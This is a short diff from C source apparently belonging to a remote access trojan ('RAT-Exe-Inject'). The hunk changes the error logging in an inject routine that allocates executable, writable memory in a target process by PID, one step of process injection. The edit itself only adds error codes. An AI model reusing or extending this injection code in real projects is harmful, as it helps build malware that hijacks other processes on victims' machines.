@@ -53,7 +53,9 @@ INT inject(__in UINT32 PID, __in UINT64 payloadSize, __in VOID* payloadBytes)
 	baseAddress = VirtualAllocEx(hProcess, NULL, payloadSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
 	if (baseAddress == NULL)
 	{
-		OutputDebugStringA("RAT-Exe-Inject::inject - Failed to allocate memory in target process!\n");
+		sprintf_s(messageBuffer, "RAT-Exe-Inject::inject - Failed to allocate memory in target process! Error %d\n", GetLastError());
+		OutputDebugStringA(messageBuffer);
+		status = ERROR_NOT_ENOUGH_MEMORY;
 		goto cleanup;
 	}
 
